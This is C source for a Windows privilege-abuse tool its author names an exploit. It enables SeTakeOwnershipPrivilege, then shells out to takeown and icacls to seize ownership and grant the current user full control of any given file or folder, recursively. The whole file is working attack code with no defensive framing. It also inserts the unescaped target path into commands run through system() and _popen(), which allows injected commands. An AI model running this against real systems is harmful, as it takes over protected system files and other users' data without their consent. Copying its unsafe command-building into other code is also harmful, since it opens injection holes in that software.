// Compilation Information
//x86_64-w64-mingw32-gcc SeTakeOwnershipPrivilege.c -o SeTakeOwnershipPrivilegeExploit.exe -ladvapi32

// Windows API Headers
#include <windows.h>

// Standard C Headers
#include <stdio.h>
#include <stdlib.h> // For system()
#include <string.h> // For strncpy, _stricmp, strrchr

// Updated to accept the error code directly for more robust error reporting.
void PrintError(const char *func, DWORD err)
{
    LPSTR msgBuf = NULL;
    FormatMessageA(
        FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
        NULL, err, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
        (LPSTR)&msgBuf, 0, NULL);
    fprintf(stderr, "%s failed with error %lu: %s\n", func, err, msgBuf);
    LocalFree(msgBuf);
}

BOOL EnableSeTakeOwnershipPrivilege()
{
    HANDLE hToken = NULL;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    // 1. Open the process token
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        PrintError("OpenProcessToken", GetLastError());
        return FALSE;
    }

    // 2. Lookup the LUID for our privilege
    if (!LookupPrivilegeValueA(NULL, "SeTakeOwnershipPrivilege", &luid)) {
        PrintError("LookupPrivilegeValueA", GetLastError());
        CloseHandle(hToken);
        return FALSE;
    }

    // 3. Fill in the TOKEN_PRIVILEGES structure
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    // 4. Attempt to enable the privilege and check for errors.
    AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);

    // 5. Check the result of the operation. This is the crucial step.
    // AdjustTokenPrivileges can return TRUE even if it fails.
    // We must check GetLastError() immediately after.
    DWORD lastError = GetLastError();
    if (lastError != ERROR_SUCCESS) {
        if (lastError == ERROR_NOT_ALL_ASSIGNED) {
            fprintf(stderr, "The token does not have the specified privilege.\n");
            fprintf(stderr, "Please try running this program with administrative rights.\n");
        } else {
            PrintError("AdjustTokenPrivileges", lastError);
        }
        CloseHandle(hToken);
        return FALSE;
    }

    printf("SeTakeOwnershipPrivilege enabled successfully for this process.\n");
    CloseHandle(hToken);
    return TRUE;
}

// Displays security info by calling a PowerShell one-liner. If access is denied,
// it traverses up the directory tree until the command succeeds.
void DisplayFileInfoAndOwner(const char* path)
{
    printf("  Querying properties for: %s\n", path);

    char mutablePath[MAX_PATH];
    strncpy(mutablePath, path, MAX_PATH - 1);
    mutablePath[MAX_PATH - 1] = '\0';

    BOOL infoDisplayed = FALSE;
    while (1)
    { // Loop will be broken internally
        char command[2048];
        // We run the display command and capture its output (including errors) to check for failure strings.
        // Note the single quotes for PowerShell and `2>&1` to redirect stderr to stdout.
        snprintf(command, sizeof(command), "powershell -Command \"Get-ChildItem -Path '%s' | select name,directory,@{Name='Owner';Expression={(Get-ACL $_.Fullname).Owner}}\" 2>&1", mutablePath);

        printf("    Attempting to query: %s\n", mutablePath);

        FILE *pipe = _popen(command, "r");
        if (!pipe) {
            fprintf(stderr, "    _popen() failed!\n");
            break;
        }

        char buffer[256];
        char output[4096] = {0}; // Buffer to hold the entire command output

        // Read the entire output from the pipe
        while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
            // Ensure we don't overflow the output buffer
            if (strlen(output) + strlen(buffer) < sizeof(output)) {
                strcat(output, buffer);
            }
        }
        _pclose(pipe);

        // Now check the captured output for known error strings.
        if (strstr(output, "PermissionDenied") != NULL || strstr(output, "UnauthorizedAccessException") != NULL) {
            // Error detected, do not print output, just try parent.
        } else {
            // No error found, print the captured output and we are done.
            printf("%s", output);
            infoDisplayed = TRUE;
            break; // Success, exit the loop.
        }

        // If we are here, an error was detected. Try the parent directory.
        char *lastSlash = strrchr(mutablePath, '\\');
        if (lastSlash) {
            *lastSlash = '\0'; // Truncate path
            if (strlen(mutablePath) < 3) { // Stop before root like "C:"
                break;
            }
        } else {
            break; // No more slashes, can't go up.
        }
    }

    if (!infoDisplayed) {
        fprintf(stderr, "  Could not query security info for the path or any of its parents. Access may be denied.\n");
    }
}

// Takes ownership of the target path using 'takeown.exe'.
BOOL TakeOwnership(const char* path) {
    printf("\n--> Step 2: Attempting to take ownership using 'takeown.exe'...\n");
    char command[1024];
    // /f specifies the file/folder. /r for recursive on directories. /d y to answer prompts.
    snprintf(command, sizeof(command), "takeown /f \"%s\" /r /d y", path);
    printf("    Executing: %s\n", command);

    int result = system(command);
    if (result == 0) {
        printf("    Success: 'takeown' command completed successfully.\n");
        return TRUE;
    } else {
        fprintf(stderr, "    Error: 'takeown' command failed with exit code %d.\n", result);
        return FALSE;
    }
}

// Grants full control to the current user using 'icacls.exe'.
BOOL GrantFullControl(const char* path) {
    printf("\n--> Step 3: Attempting to grant Full Control to current user...\n");

    char username[256];
    DWORD username_len = 256;
    if (!GetUserNameA(username, &username_len)) {
        PrintError("GetUserNameA", GetLastError());
        return FALSE;
    }

    char command[1024];
    // /grant grants permissions. (F) is for Full Control. /t for recursive on directories.
    snprintf(command, sizeof(command), "icacls \"%s\" /grant \"%s\":(F) /t", path, username);
    printf("    Executing: %s\n", command);

    int result = system(command);
    if (result == 0) {
        printf("    Success: 'icacls' command completed successfully.\n");
        return TRUE;
    } else {
        fprintf(stderr, "    Error: 'icacls' command failed with exit code %d.\n", result);
        return FALSE;
    }
}

int main(int argc, char* argv[])
{
    if (argc != 2) {
        fprintf(stderr, "Usage: %s \"<path_to_file_or_folder>\"\n", argv[0]);
        return 1;
    }
    const char* targetPath = argv[1];

    printf("--> Step 1: Enabling SeTakeOwnershipPrivilege...\n");
    if (!EnableSeTakeOwnershipPrivilege()) {
        fprintf(stderr, "    Failed to enable privilege. Ensure you are running as an Administrator.\n");
        return 1;
    }
    printf("    Success: Privilege enabled for this process.\n");

    printf("\n--- File Information (Before Changes) ---\n");
    DisplayFileInfoAndOwner(targetPath);

    if (TakeOwnership(targetPath)) {
        if (GrantFullControl(targetPath)) {
            printf("\nOperation completed successfully.\n");
        } else {
            fprintf(stderr, "\nFailed to grant full control after taking ownership.\n");
        }
    } else {
        fprintf(stderr, "\nFailed to take ownership. Aborting.\n");
    }

    printf("\n--- File Information (After Changes) ---\n");
    DisplayFileInfoAndOwner(targetPath);

    return 0;
}
